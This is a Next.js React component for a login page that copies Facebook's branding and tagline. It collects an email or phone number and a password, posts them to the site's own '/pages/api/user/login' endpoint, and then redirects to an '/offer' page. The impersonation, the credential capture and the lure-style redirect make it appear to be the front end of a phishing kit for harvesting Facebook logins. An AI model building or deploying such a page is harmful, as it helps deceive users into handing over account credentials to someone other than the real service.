"use client"
import React from 'react'
import axios from 'axios'
import swal from "sweetalert"
import { useRouter } from 'next/navigation'
const Home = () => {
  const router = useRouter()

  const loginHandler = async (e: any) => {
    e.preventDefault()
    try {
      const formData = new FormData(e.target)
      const emailOrPhone = formData.get("emailOrPhone")
      const password = formData.get("password")
      const response = await axios.post("/pages/api/user/login", { emailOrPhone, password })
      if (response?.data?.success) {
        swal({
          title: response?.data?.message,
          icon: "success"
        })
        router.push("/offer")
      } else {
        swal({
          title: response?.data?.message,
          icon: "warning"
        })
      }


    } catch (error) {
      throw new Error(String(error))

    }
  }

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-100">
      <div className="flex flex-col justify-center items-center bg-white p-8 rounded-xl shadow-lg w-96">
        <h1 className="text-4xl font-bold text-blue-600">facebook</h1>
        <p className="text-gray-600 text-sm mt-2">Facebook helps you connect and share with the people in your life.</p>

        <form onSubmit={loginHandler} className="mt-8 w-full">
          <input
            type="text"
            name='emailOrPhone'
            required
            placeholder="Email address or phone number"
            className="w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
          />
          <input
            type="password"
            placeholder="Password"
            name='password'
            required
            className="w-full mt-4 p-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
          />

          <button
            type="submit"
            className="w-full mt-4 p-2 bg-blue-500 text-white font-bold rounded-md hover:bg-blue-600 focus:outline-none"
          >
            Log in
          </button>
        </form>

        <div className="flex items-center justify-between mt-4 w-full">
          <button className="text-sm text-blue-600">Forgotten password?</button>
          <button className="text-sm text-green-500">Create new account</button>
        </div>

        <div className="mt-6 text-center text-sm text-gray-500">
          <p>Create a Page for a celebrity, brand or business.</p>
        </div>
      </div>
    </div>
  )
}

export default Home
